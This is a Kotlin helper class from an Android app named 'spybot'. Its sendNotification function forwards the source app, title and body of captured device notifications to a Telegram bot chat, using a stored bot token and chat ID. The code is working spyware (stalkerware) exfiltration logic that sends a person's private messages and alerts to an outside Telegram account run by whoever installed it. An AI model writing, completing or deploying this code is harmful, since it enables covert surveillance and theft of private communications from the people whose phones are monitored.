package com.example.spybot.helper

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Toast
import com.example.spybot.network.TelegramApiService
import com.example.spybot.utils.AppPreferences
import com.example.spybot.utils.TelegramResponse
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.TimeUnit

object TelegramHelper {

    private const val BASE_URL = "https://api.telegram.org/"
    private const val TAG = "TELEGRAM_SPY"

    private val logging = HttpLoggingInterceptor().apply {
        level = HttpLoggingInterceptor.Level.BODY
    }

    private val client = OkHttpClient.Builder()
        .addInterceptor(logging)
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val retrofit = Retrofit.Builder()
        .baseUrl(BASE_URL)
        .client(client)
        .addConverterFactory(GsonConverterFactory.create())
        .build()

    private val apiService = retrofit.create(TelegramApiService::class.java)

    fun sendNotification(context: Context, title: String, body: String, packageName: String) {
        val token = AppPreferences.getToken(context) ?: ""
        val chatId = AppPreferences.getChatId(context) ?: ""

        if (token.isEmpty() || chatId.isEmpty()) {
            Log.e(TAG, "Token or Chat ID is empty! Please configure first.")
            return
        }

        val message = "<b>New Notification!</b>\n\n" +
                "<b>App:</b> $packageName\n" +
                "<b>Title:</b> $title\n" +
                "<b>Body:</b> $body"

        val endpointUrl = "https://api.telegram.org/bot$token/sendMessage"

        try {
            apiService.sendMessage(endpointUrl, chatId, message, "HTML").enqueue(object : Callback<TelegramResponse> {
                override fun onResponse(call: Call<TelegramResponse>, response: Response<TelegramResponse>) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Sent to Telegram successfully!")
                    } else {
                        val errorBody = response.errorBody()?.string()
                        Log.e(TAG, "Telegram API Error [${response.code()}]: $errorBody")
                        
                        // Screen par toast dikhayega agar Telegram ne mana kiya (e.g. Chat not found / Unauthorized)
                        Handler(Looper.getMainLooper()).post {
                            Toast.makeText(context, "Telegram Error: ${response.code()}", Toast.LENGTH_SHORT).show()
                        }
                    }
                }

                override fun onFailure(call: Call<TelegramResponse>, t: Throwable) {
                    Log.e(TAG, "Network connection error: ${t.message}")
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Exception: ${e.message}")
            e.printStackTrace()
        }
    }
}
